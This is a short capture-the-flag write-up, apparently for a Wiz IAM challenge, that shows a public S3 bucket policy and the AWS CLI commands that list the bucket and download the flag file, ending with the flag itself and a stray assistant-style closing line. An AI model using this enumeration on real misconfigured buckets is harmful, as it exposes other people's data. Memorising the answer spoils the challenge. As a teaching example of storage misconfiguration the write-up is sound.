# Bucket Challenge

## Problem Description

**Buckets of Fun:** We all know that public buckets are risky. But can you find the flag?

## IAM Policy

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

## Solution
This problem involves ListObject and GetObject permissions for the "thebigiamchallenge-storage-9979f4b" bucket, which are open to anyone (Principal: *) to check the file list and download files.

## Proof of Concept (PoC)
Install AWS CLI.
Create an IAM user with permissions set to AmazonS3ReadOnlyAccess.
Generate access keys for the user.
Configure AWS CLI using the generated access keys.

File List Check:
```json
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
2023-06-06 04:13:53         37 flag1.txt
2023-06-09 04:18:24      81889 logo.png
Download File and Obtain Flag:
```

```json
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt ./
download: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt to .\flag1.txt
```

```
> type flag1.txt
{wiz:exposed-storage-risky-as-usual}
Looks like they found the flag!
```

Feel free to customize it further based on your project's specific needs!
